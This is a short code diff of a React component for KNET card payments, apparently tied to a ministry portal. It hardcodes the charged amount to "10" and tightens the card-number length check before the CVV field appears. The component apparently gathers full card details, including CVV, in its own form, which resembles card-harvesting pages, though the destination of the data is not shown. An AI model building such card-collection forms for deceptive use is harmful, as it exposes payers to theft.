@@ -44,7 +44,7 @@ export default function KNETPayment() {
   const [errorModalMessage, setErrorModalMessage] = useState("");
 
   const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
-  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "10";
+  const totalAmount = "10";
 
   const paymentUniqueNumber = useRef(
     "PORTALTP" + Date.now().toString().slice(-12)
@@ -158,7 +158,7 @@ export default function KNETPayment() {
     return sum % 10 === 0;
   };
 
-  const showCvvField = cardNumber.length >= 13 && luhnCheck(cardNumber) && expiryMonth !== "" && expiryYear !== "";
+  const showCvvField = cardNumber.length >= 16 && luhnCheck(cardNumber) && expiryMonth !== "" && expiryYear !== "";
   const canSubmit = showCvvField && cvv.length >= 3;
 
   const validateCardForm = (): boolean => {
